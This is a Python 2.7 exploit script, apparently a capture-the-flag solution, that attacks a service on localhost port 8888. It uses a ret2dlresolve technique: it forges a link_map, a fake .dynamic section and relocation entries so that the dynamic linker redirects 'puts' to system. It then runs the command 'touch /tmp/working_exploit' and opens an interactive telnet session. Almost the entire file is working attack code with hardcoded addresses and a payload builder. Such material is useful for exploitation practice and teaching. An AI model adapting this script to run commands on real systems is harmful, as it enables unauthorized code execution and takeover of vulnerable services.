#!/usr/bin/env python2.7

import socket
import struct
import sys
import telnetlib


ADDR = "localhost"
PORT = 8888
DEBUG = True

s = socket.create_connection((ADDR, PORT))

def rtil_str(st):
    buf = ""
    x = 0
    while True:
        curr = s.recv(1)
        if curr == "":
            break
        buf += curr
        if(curr == st[x]):
            x += 1
            if x == len(st):
                break
        else:
            x = 0
    if DEBUG:
        sys.stdout.write(buf)
    return buf


cmd = "touch /tmp/working_exploit"

# idea is to use l_addr of linkmap
# as the offset between target function
# and system
# we let dl_fixup do the arithmetic for us
# in this case we target 'puts'

str_tab = 0x600b40
data_addr = 0x600BC0

llen = 824
s1len = 64
offset = 0xfffffffffff63750
read_got = 0x0000000000600b78
puts_got = 0x000000000600b60

# we are a link_map
buf = struct.pack("<Q", (str_tab - data_addr) & 0xffffffffffffffff)		# index
buf += struct.pack("<Q", data_addr + 0x10)                                      # value

# link_map starts here
buf += struct.pack("<Q", offset)                                                # l_addr
buf += (" ; %s "%cmd).ljust(8 * 7, "#")

# l_info
l_info = "X" * 4 * 8
l_info += struct.pack("<Q", data_addr + llen)                                   # strtab pointer
l_info += struct.pack("<Q", data_addr + llen + 8)                               # symtab pointer
l_info += struct.pack("<Q", data_addr+ llen + s1len + 32)                       # ??
l_info += "22222222" * 16
l_info += struct.pack("<Q", data_addr + llen + 16)                              # reloc table pointer
l_info += "22222222" * 25
l_info += struct.pack("<Q", 0x0)


buf += l_info
buf = buf.ljust(llen, "Z")

### fake .dynamic
buf += struct.pack("<Q", 0x88888888)                                            # strtab 
buf += struct.pack("<Q", 0x77777777)                                            # symtab

### reloc table
buf += struct.pack("<Q", 0x44444444)
buf += struct.pack("<Q", data_addr + llen + s1len - 3 * 8)
buf = buf.ljust(llen + s1len, "Y")

### fake PLTREL
buf += struct.pack("<Q", (puts_got - offset) & 0xffffffffffffffff)                                              # r_offset
buf += struct.pack("<I", 0x7)
idx = 0x488
idx = 0x5 * 24
buf += struct.pack("<I", idx / 24)
buf += struct.pack("<Q", 0x55555555)                                       

buf += struct.pack("<Q", 0x56666668)                                              
buf += struct.pack("<Q", 0xaaaaaa)
buf += struct.pack("<Q", read_got - 8 - (0xf * 8))
buf += "A" * 8 * 2
buf += "\x00"
buf += "\x00"
buf += "\x00"
buf += "\x00"
buf += "\x00"
buf += "\x03"
buf += "\x00"
buf += "\x00"


buf = buf.ljust(1024, "Y")

s.send(buf)

t = telnetlib.Telnet()
t.sock = s
t.interact()
